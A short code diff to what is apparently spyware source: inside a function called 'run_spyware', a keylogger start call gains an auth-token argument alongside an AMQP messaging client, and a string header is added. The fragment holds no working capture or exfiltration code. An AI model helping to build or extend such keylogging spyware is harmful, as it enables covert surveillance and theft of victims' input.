@@ -1,6 +1,7 @@
 #include <stdlib.h>
 #include <iostream>
 #include <fstream>
+#include <string>
 
 #if defined(_WIN64) || defined(_WIN32)
 #include <windows.h>
@@ -33,7 +34,7 @@ int run_spyware () {
         return EXIT_FAILURE;
     }
 
-    startKeylogger(amqpClient);
+    startKeylogger(amqpClient, authToken);
 
     return EXIT_SUCCESS;
 }
